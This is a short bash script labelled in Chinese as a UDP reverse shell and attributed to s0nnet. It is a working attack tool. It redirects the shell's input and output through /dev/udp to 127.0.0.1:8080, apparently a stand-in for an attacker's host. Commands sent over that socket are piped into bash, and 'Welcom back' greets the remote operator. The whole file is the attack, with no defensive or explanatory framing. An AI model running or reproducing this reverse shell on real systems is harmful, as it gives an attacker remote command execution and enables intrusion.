#!/bin/bash

# >  desc: 反弹shell udp版 
# >  author: s0nnet

exec 3>/dev/udp/127.0.0.1/8080
exec 2>&3 
exec 1>&3 
echo Welcom back 
cat 0<&3 | bash | while read line;do echo $line;done
